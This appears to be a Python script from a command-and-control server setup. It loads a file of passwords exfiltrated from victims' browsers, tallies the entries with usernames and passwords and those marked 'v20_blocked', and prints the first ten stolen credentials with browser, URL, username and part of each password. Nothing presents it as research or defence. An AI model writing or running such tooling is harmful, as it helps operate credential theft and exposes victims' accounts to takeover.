import json
d = json.load(open('c2server/data/435827de4e2e9bc7/exfil/passwords_20260517_124831.json'))
entries = d['entries']
users = [e for e in entries if e.get('user','')]
pws = [e for e in entries if e.get('pass','')]

print(f'Total entries: {len(entries)}')
print(f'With username: {len(users)}')
print(f'With password: {len(pws)}')
print(f'v20_blocked:   {len([e for e in entries if e.get("status")=="v20_blocked"])}')
print()
print('=== Sample credentials (first 10 with usernames) ===')
for i, e in enumerate(users[:10]):
    url = e.get('url','')[:45]
    user = e.get('user','')[:30]
    pw = e.get('pass','') or e.get('status','')
    br = e.get('browser','')
    print(f'  [{i+1}] {br:8} | {url:45} | {user:30} | {pw[:15]}')
